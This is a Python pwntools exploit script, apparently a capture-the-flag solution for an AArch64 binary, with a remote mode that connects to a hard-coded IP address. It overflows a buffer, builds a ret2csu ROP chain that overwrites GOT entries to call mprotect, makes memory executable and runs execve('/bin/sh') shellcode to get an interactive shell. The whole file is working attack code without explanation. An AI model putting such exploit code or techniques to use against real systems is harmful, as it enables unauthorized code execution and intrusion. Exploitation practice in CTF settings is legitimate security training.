#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./pwn"
context.log_level = "debug"

if sys.argv[1] == "l":
    io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
elif sys.argv[1] == "d":
    io = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
else:
    io = remote("106.75.126.171", 33865)

def csu_rop(call, x0, x1, x2):
    payload = flat(0x4008CC, '00000000', 0x4008ac, 0, 1, call)
    payload += flat(x2, x1, x0)
    payload += '22222222'
    return payload


if __name__ == "__main__":
    elf = ELF("./pwn", checksec = False)
    padding = asm('mov x0, x0')

    sc = asm(shellcraft.execve("/bin/sh"))
    #  print disasm(padding * 0x10 + sc)
    io.sendafter("Name:", padding * 0x10 + sc)
    sleep(0.01)

    #  io.send(cyclic(length = 500, n = 8))
    #  raw_input("DEBUG: ")
    payload = flat(cyclic(72), csu_rop(elf.got['read'], 0, elf.got['__gmon_start__'], 8))
    payload += flat(0x400824)
    io.send(payload)
    sleep(0.01)
    io.send(flat(elf.plt['mprotect']))
    sleep(0.01)

    io.sendafter("Name:", padding * 0x10 + sc)
    sleep(0.01)

    payload = flat(cyclic(72), csu_rop(elf.got['__gmon_start__'], 0x411000, 0x1000, 7))
    payload += flat(0x411068)
    sleep(0.01)
    io.send(payload)

    io.interactive()
